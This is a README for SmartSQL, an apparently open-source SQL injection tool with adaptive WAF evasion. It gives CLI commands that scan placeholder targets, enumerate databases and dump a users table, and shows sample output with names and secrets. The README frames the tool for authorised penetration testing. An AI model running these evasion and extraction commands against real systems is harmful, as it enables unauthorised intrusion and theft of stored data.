# SmartSQL

**An adaptive SQL injection engine with a self-adapting WAF-evasion loop.**

SmartSQL takes the ideas behind tools like `sqlmap` and `ghauri` and adds a
closed feedback loop on top. Instead of picking one tamper script up front and
hoping it works, SmartSQL *watches how the target reacts* and adapts in real
time: it escalates payload obfuscation when a WAF blocks it, rotates request
identity, and backs off its request rate when it gets throttled — converging on
whatever gets a request through.

> ⚠️ **For authorised security testing only.** Only run SmartSQL against systems
> you own or have **explicit written permission** to test. Unauthorised use may
> be illegal.

---

## Why "smart"?

Classic scanners are largely *open loop*: configuration in, results out. SmartSQL
runs an **adaptation controller** ([`adaptive.py`](src/smartsql/adaptive.py))
that closes the loop around every request:

| Signal the target gives | How SmartSQL reacts |
| --- | --- |
| `BLOCKED` (403/406, block page) | Penalise the current tamper chain, **escalate** to a stronger one, rotate `User-Agent` |
| `RATE_LIMITED` (429) | **Multiplicative back-off** on request delay + add jitter |
| `NETWORK_ERROR` (timeout/reset) | Back off timing, retry with exponential delay |
| `OK` | **Reward** the chain — it becomes the preferred baseline for the rest of the scan |

Each tamper chain is scored by its live pass-rate, so over a scan SmartSQL learns
which encoding reliably slips past *this particular* filter.

## Features

- **WAF fingerprinting** — vendor signatures (Cloudflare, Akamai, AWS WAF,
  Imperva, F5 BIG-IP, ModSecurity, Sucuri, and more) **plus** behavioural block
  detection, so unknown/custom WAFs are still caught.
- **Four detection techniques** — error-based, boolean-based blind,
  time-based blind, and UNION-query-based.
- **Data extraction** — once a hit is confirmed, SmartSQL enumerates and dumps
  data (banner, current user/db, databases → tables → columns → rows) and
  automatically picks the **fastest working channel**:
  - **UNION** — a full value per request via a reflected column,
  - **error-based** — a value leaked in a DB error (chunked when truncated),
  - **boolean blind** — binary-search each character against a truth oracle,
  - **time blind** — same search, but the oracle is response latency.

  It self-tests the fast channel and transparently falls back to blind if the
  target doesn't cooperate.
- **DBMS fingerprinting & dialects** — MySQL, PostgreSQL, MSSQL, SQLite (plus
  Oracle detection), with dialect-correct enumeration SQL and quote-free
  literals (built from `CHAR()`/`chr()`) that survive inside quoted contexts.
- **Adaptive tamper engine** — a library of composable tamper scripts and an
  escalation ladder driven by the feedback loop. Extraction runs *through* the
  same adaptor, so every dump request keeps evading the WAF.
- **Flexible targeting** — GET/POST params, cookies, and headers; pin an exact
  injection point with a `*` marker (sqlmap-compatible).
- **Evasion knobs** — proxy support, per-request delay/jitter, User-Agent
  rotation, TLS-verification toggle.

## Installation

```bash
git clone https://github.com/CypherNova1337/SmartSQL
cd SmartSQL
pip install -e .          # add [dev] for the test suite: pip install -e ".[dev]"
```

Requires Python 3.9+.

## Usage

```bash
# Basic scan of a GET parameter
smartsql -u "http://target/item.php?id=1"

# Pin the injection point, POST body, custom cookie, verbose adaptation log
smartsql -u "http://target/item.php" \
         --data "id=1*&cat=2" \
         -c "session=abcd" \
         -v

# Only boolean + time-based, through Burp, slow and quiet
smartsql -u "http://target/?q=test" \
         --technique BT \
         --proxy http://127.0.0.1:8080 \
         --delay 1 --jitter 2 --random-agent

# List available tamper scripts
smartsql --list-tampers
```

### Extracting data

Once an injection is confirmed, add extraction flags — SmartSQL runs the
enumeration through whichever channel is fastest for the target:

```bash
# Fingerprint the backend
smartsql -u "http://target/product?id=1" --banner --current-db --current-user

# Enumerate schema
smartsql -u "http://target/product?id=1" --dbs
smartsql -u "http://target/product?id=1" --tables -D shop
smartsql -u "http://target/product?id=1" --columns -D shop -T users

# Dump a table (optionally specific columns)
smartsql -u "http://target/product?id=1" --dump -D shop -T users
smartsql -u "http://target/product?id=1" --dump -D shop -T users -C name,secret
```

Example output:

```
[+] data extraction (channel: union):
    banner       : 3.45.1
    databases    : main
    tables[main] : users, products

    dump main.users (3 rows):
    id | name  | secret
    ------------------------
    1  | admin | s3cr3t-flag
    2  | bob   | hunter2
    3  | alice | wonderland
```

### Key options

| Flag | Meaning |
| --- | --- |
| `-u, --url` | Target URL (use `*` to mark an injection point) |
| `--data` | POST body (implies `POST`) |
| `-H, --header` | Extra header `Name: value` (repeatable) |
| `-c, --cookie` | Cookie string `a=1; b=2` |
| `--technique` | Subset of `B`oolean `E`rror `T`ime `U`nion (default all) |
| `--time-delay` | Seconds for time-based payloads (default 5) |
| `--no-waf` | Skip WAF detection |
| `--proxy` | Proxy URL |
| `--delay` / `--jitter` | Base / random inter-request delay |
| `--random-agent` | Rotate User-Agent every request |
| `-k, --insecure` | Skip TLS verification |
| `-v, --verbose` | Stream adaptation events live |
| `--banner` / `--current-user` / `--current-db` | Fingerprint the backend |
| `--dbs` / `--tables` / `--columns` / `--dump` | Enumerate schema / dump rows |
| `-D` / `-T` / `-C` | Database / table / columns for the above |
| `--max-rows` | Cap rows fetched during enumeration/dump |

## How it fits together

```
             ┌────────────┐   payload
   Target ──▶│  Scanner   │──────────────┐
             └────────────┘              ▼
              │      ▲          ┌───────────────────┐
   WAFDetector│      │ findings │ AdaptiveController │  picks tamper chain,
              ▼      │          │  (feedback loop)   │  escalates on block,
        ┌──────────────────┐    └───────────────────┘  backs off on 429
        │    Techniques    │◀────────────┘  │
        │  error/boolean/  │                ▼
        │   time/union     │          ┌──────────┐  outcome-classified
        └──────────────────┘          │  Engine  │  HTTP (identity/timing)
                                       └──────────┘
```

- [`engine.py`](src/smartsql/engine.py) — HTTP transport; classifies every
  response into a stable `Outcome`.
- [`waf.py`](src/smartsql/waf.py) — signature + behavioural WAF detection.
- [`adaptive.py`](src/smartsql/adaptive.py) — the self-adaptation controller.
- [`tamper.py`](src/smartsql/tamper.py) — tamper script registry.
- [`techniques.py`](src/smartsql/techniques.py) — the four detection methods.
- [`dbms.py`](src/smartsql/dbms.py) — DBMS fingerprints & dialect payloads.
- [`queries.py`](src/smartsql/queries.py) — per-DBMS SQL dialects for extraction.
- [`extract.py`](src/smartsql/extract.py) — oracles, data channels & enumeration.
- [`scanner.py`](src/smartsql/scanner.py) — orchestration & reporting.

## Testing

```bash
pip install -e ".[dev]"
pytest
```

The suite includes an end-to-end test that stands up a mock vulnerable app
behind a simulated WAF and asserts SmartSQL detects the WAF, gets blocked on a
naive payload, adapts, and still finds the injection.

## Roadmap

- ~~Data extraction / dumping once an injection is confirmed~~ ✅ done
- Second-order and header/JSON-body injection points
- Asynchronous, concurrent point testing with a shared adaptation budget
- Resumable sessions + on-disk result caching (skip already-extracted values)
- Oracle DBMS extraction dialect (detection already supported)
- Pluggable tamper scripts from user files
- Machine-learned tamper-chain selection from historical scans

## License

MIT — see [`LICENSE`](LICENSE).
